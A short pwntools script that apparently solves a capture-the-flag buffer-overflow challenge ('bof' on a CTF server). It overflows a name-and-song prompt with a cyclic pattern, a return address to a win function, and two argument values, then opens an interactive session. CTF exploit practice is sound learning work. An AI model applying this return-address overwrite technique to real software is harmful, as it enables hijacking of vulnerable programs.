from pwn import *

if "rem" in sys.argv:
        proc = remote("ctf.umbccd.io", 4000)
else:
        proc = process("./bof")

proc = remote("ctf.umbccd.io", 4000)

#name doesn't matter, we'll overflow song
print proc.readuntil("name?")
proc.sendline("AAAA")

#overflow song with return address to win along with the time 1200 and room number 366
print proc.readuntil("singing?")
proc.sendline(cyclic(112) + p32(0x08049182) + "BBBB" + p32(0x4b0) + p32(366))
proc.interactive()
